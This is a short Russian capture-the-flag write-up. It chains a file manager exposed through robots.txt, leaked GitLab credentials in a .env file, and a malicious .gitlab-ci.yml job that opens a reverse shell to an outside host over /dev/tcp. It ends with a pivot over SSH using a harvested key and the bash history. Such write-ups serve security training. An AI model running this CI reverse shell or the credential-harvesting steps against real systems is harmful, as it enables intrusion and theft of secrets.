Решение от @Dan1Lev

Заглянув в robots.txt блога находим "Файловый менеджер" 
Disallow: /shell.php
Внутни которого лежит .env файл из которого получаем адрес и данные для gitlab

Открываем репозиторий и создаём CI/CD файл .gitlab-ci.yml через который получаем обратную оболочку
stages:
  - build

shell:
  stage: build
  script:
    - sh -i >& /dev/tcp/ts.fsox.ru/1964 0>&1

В корневой папке пользователя в .ssh находим ssh ключ, а в .bash_history логин и хост
подключаемся и забираем флаг
shell

ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa prod@production cat flag.txt

